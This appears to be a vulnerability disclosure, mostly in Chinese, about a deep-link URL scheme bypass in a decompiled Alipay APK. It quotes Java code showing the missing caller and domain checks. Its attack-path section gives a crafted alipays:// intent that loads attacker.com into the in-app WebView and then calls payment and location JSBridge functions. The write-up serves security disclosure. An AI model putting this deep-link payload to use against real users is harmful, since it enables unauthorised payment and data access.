# CVE-1: DeepLink URL Scheme绕过 (CWE-939) 代码证据

> APK 版本: Alipay 10.8.30.8000 | jadx 反编译输出
> 更新: 2026-03-16 — 补充完整调用链代码证据

## 关键类/方法

### SchemeLauncherActivity — DeepLink 入口 Activity
- 文件: `sources/com/alipay/mobile/quinox/SchemeLauncherActivity.java`
- 行号: 240-338

```java
// onCreate: Intent 直接分发，无来源身份验证
@Override
public void onCreate(Bundle bundle) {
    super.onCreate(bundle2);
    try {
        if (DexAOPEntry.android_app_Activity_getIntent_proxy(this) == null) {
            finish();
            return;
        }
        LoggerFactory.getTraceLogger().info(w0.f164911a, " enter onCreate..");
        // ... (window styling only, no caller verification)
        setRequestedOrientation(1);
        a();
        schemeLauncherActivity.f192533a.j(bundle2);  // 直接分发给 scheme 处理器
    } catch (Exception e2) {
        LoggerFactory.getTraceLogger().error(w0.f164911a, e2);
        finish();
    }
}

// onNewIntent: 同样无来源校验
@Override
public void onNewIntent(Intent intent) {
    super.onNewIntent(intent2);
    setIntent(intent2);
    LoggerFactory.getTraceLogger().info(w0.f164911a, " enter onNewIntent..");
    a();
    schemeLauncherActivity.f192533a.l(intent2);  // 直接转发，无验证
}
```

### SchemeServiceImpl — getParams() URL 提取无过滤
- 文件: `sources/com/alipay/mobile/framework/service/common/impl/SchemeServiceImpl.java`
- 行号: 1161-1179

```java
@Override
public Bundle getParams(Uri uri) {
    Bundle bundle = new Bundle();
    for (String str : o(uri2)) {
        bundle.putString(str, uri2.getQueryParameter(str));  // URI 参数原样复制，无白名单过滤
    }
    bundle.putString("appId", getSourceAppId(uri2));
    return bundle;
    // 整个方法：零域名验证，零签名检查
}

// getSourceAppId 解析 (行 1437):
// "app".equals(uri2.getHost()) ? uri2.getPath().substring(1) : uri2.getQueryParameter("appId")
```

### SchemeServiceImpl — startApp 触发 H5 容器 (appId=20000067)
- 文件: `sources/com/alipay/mobile/framework/service/common/impl/SchemeServiceImpl.java`
- 行号: 1054-1065 (openurl) + 2108-2124 (startapp)

```java
// openurl action: URL 原样传入 H5 容器
Bundle bundle = new Bundle();
String str3 = SchemeService.h5Url;
if (TextUtils.isEmpty(str2)) { str2 = str3; }
H5ParamCompService h5ParamCompService = ComponentService.get(H5ParamCompService.class);
if (h5ParamCompService != null) {
    bundle.putString(h5ParamCompService.getUrl(), str2);    // URL 无验证放入
    bundle.putString(h5ParamCompService.getShowToolBar(), "NO");
}
microApplicationContext.startApp("", "20000067", bundle);   // 启动 H5 容器

// startapp action (process() 方法):
public void process() {
    Bundle params = this.this$0.getParams(this.val$externUriSub, this.val$schemeInnerSource);
    // ...
    params.putString("appId", this.val$sourceAppId);
    SchemeServiceImpl.a(this.this$0, params, this.val$extInfo);
    this.this$0.getMicroApplicationContext().startApp(null, "20000067", params, this.val$extInfo, null);
    // ^ "20000067" = H5 WebView 容器，URL 未经域名白名单直接加载
}
```

---

## 原有分析 (保留)

## Source: Alipay APK 10.8.30.8000 (jadx decompiled)

### SchemeLauncherActivity
**File**: `sources/com/alipay/mobile/quinox/SchemeLauncherActivity.java`
**Lines**: 240-288

```java
@Override // android.app.Activity
public void onCreate(Bundle bundle) {
    // ...
    super.onCreate(bundle2);
    try {
        getWindow().getDecorView();
        if (DexAOPEntry.android_app_Activity_getIntent_proxy(this) == null) {
            finish();
            return;
        }
        LoggerFactory.getTraceLogger().info(w0.f164911a, " enter onCreate..");
        // ... (window styling only)
        setRequestedOrientation(1);
        a();
        schemeLauncherActivity.f192533a.j(bundle2);  // delegates directly to scheme processor
    } catch (Exception e2) {
        LoggerFactory.getTraceLogger().error(w0.f164911a, e2);
        finish();
    }
}

@Override // android.app.Activity
public void onNewIntent(Intent intent) {
    // ...
    super.onNewIntent(intent2);
    setIntent(intent2);
    LoggerFactory.getTraceLogger().info(w0.f164911a, " enter onNewIntent..");
    a();
    schemeLauncherActivity.f192533a.l(intent2);  // delegates directly, no validation
}
```

### SchemeLaunchRouter — processSchemeInner and schemeServiceProcess
**File**: `sources/com/alipay/mobile/commonbiz/biz/SchemeLaunchRouter.java`
**Lines**: 2164-2256

```java
public void processSchemeInner(Uri uri, String str, String str2, String str3, String str4) {
    // ...
    if ((schemeService = (SchemeService) TLCommonUtils.getService(SchemeService.class)) != null) {
        try {
            SourceInfo isSchemeFromOutSide = isSchemeFromOutSide();
            boolean isOutside = isSchemeFromOutSide.isOutside();
            Bundle bundle = new Bundle();
            SchemeUtils.addIntentBundleParams(bundle, this.mIntent);
            bundle.putBoolean("isOriginStartFromExternal", isOutside);
            TLCommonUtils.addFromSchemeRouter(bundle, this.mIntent);
            bundle.putString("sourcePackageName", isSchemeFromOutSide.getPackageName());
            SchemeBootLinkManager.getInstance().initSkipLoginOrSkipHomepage(uri.toString());
            schemeServiceProcess(uri, isOutside, null, bundle);  // dispatches immediately
        } catch (Exception e2) { ... }
    }
}

public void schemeServiceProcess(Uri uri, boolean z, String str, Bundle bundle) {
    // ...
    SchemeService schemeService = (SchemeService) TLCommonUtils.getService(SchemeService.class);
    // ...
    schemeService.processAsync(uri2, z, str, bundle, new SchemeProcessCallback(this) { ... });
    // NO caller identity verification, NO origin authentication
}
```

### Vulnerability Analysis (原有)

The `SchemeLauncherActivity` is an exported Android Activity registered in the app manifest to handle `alipays://` and `alipay://` URI schemes. When it receives an incoming Intent (either via `onCreate` or `onNewIntent`), it immediately delegates the URI to `SchemeLaunchRouter` — only checking whether the Intent itself is null, never verifying who sent it or whether the caller is trusted.

The `schemeServiceProcess` method propagates the URI down to `SchemeService.processAsync()` carrying only a boolean `isOutside` flag (whether it came from outside the app). Critically, there is no authentication gate: no check that the caller has a valid session token, no signature verification of the calling package, and no allowlist enforcement before the scheme is dispatched. Any app or web page that can fire an `alipays://` deep-link Intent — including a malicious website opened in any browser — can trigger arbitrary in-app navigation in Alipay without the user having been identified or consented to the specific action being dispatched.

---

## 漏洞根因 (基于代码分析)

`SchemeLauncherActivity` 注册为支付宝的 DeepLink 入口，接收 `alipay://` / `alipays://` URI。`onCreate`/`onNewIntent` 在取得 Intent 后**直接转发**，无调用方身份验证。

`SchemeServiceImpl.getParams()` 将所有 URI query parameter 原样复制到 Bundle（行 1174-1176），**无域名白名单过滤**。最终 `startApp(null, "20000067", params)` 将携带任意 `url=` 值的 Bundle 传入 H5 WebView 容器。

关键缺失：
1. 无来源签名验证（Intent caller 包名未受信校验）
2. `getParams()` 无 URL 域名白名单
3. appId=20000067（H5页面容器）对 `url` 参数无过滤

## 攻击路径

```
外部 App / 短链 / 网页点击
    ↓
Intent: alipays://platformapi/startApp?appId=20000067&url=https://attacker.com
    ↓
SchemeLauncherActivity.onCreate()  [无来源校验]
    ↓
f192533a.j(bundle) → SchemeServiceImpl.processAsync()
    ↓
getParams(uri)  [无域名白名单，原样复制 url 参数]
    ↓
MicroApplicationContext.startApp("", "20000067", params)
    ↓
H5 WebView 加载 https://attacker.com
    ↓
攻击者页面调用 JSBridge: tradePay / getLocation / setTitle / toast
```
